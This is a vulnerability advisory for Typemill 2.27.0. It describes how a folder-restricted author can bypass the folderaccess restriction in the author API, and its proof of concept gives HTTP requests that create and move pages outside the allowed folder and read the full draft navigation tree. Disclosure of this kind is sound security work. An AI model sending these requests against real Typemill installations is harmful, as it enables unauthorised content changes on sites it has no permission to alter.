# Typemill folderaccess restriction bypass in author content API

## Summary

Typemill 2.27.0 does not enforce the configured `folderaccess` restriction before author API writes. An author restricted to one folder can create pages in other folders, move pages into unauthorized folders, and view the complete draft navigation tree.

## Details

The affected endpoints are `/api/v1/article`, `/api/v1/article/sort`, and `/api/v1/navigation?draft=true`.

The create and move handlers resolve the destination from user-controlled parameters and perform filesystem writes without calling the existing folder-access check. Folder filtering is applied only to some response navigation data, after the write has already occurred. The draft navigation endpoint returns the full tree without applying the same restriction.

The issue was verified at commit `dc644958c716ac393c63daeb98891c66eaae8ccd` (Typemill 2.27.0).

## Proof of concept

Configure an author account `bob` with `folderaccess: getting-started`, and enable API access.

### Create outside the allowed folder

```http
POST /api/v1/article
Content-Type: application/x-www-form-urlencoded

url=/getting-started&folder_id=root&item_name=unauthorized-page&type=file
```

The request returns HTTP 200 and creates a page outside `getting-started`.

### Move into another folder

```http
POST /api/v1/article/sort
Content-Type: application/x-www-form-urlencoded

url=/unauthorized-page&item_id=<source-key>&parent_id_from=0&parent_id_to=<destination-key>
```

The request returns HTTP 200 and moves the page into the unauthorized destination folder.

### Read unrestricted draft navigation

```http
GET /api/v1/navigation?draft=true
```

The response includes folders outside the configured `folderaccess` scope.

The behavior was reproduced against a local Typemill 2.27.0 instance. Test-created pages were removed after verification.

## Impact

A folder-restricted author can modify content outside the administrator-assigned scope and learn the structure and titles of other folders. Moving content can also trigger renaming/reindexing of files in the destination folder.

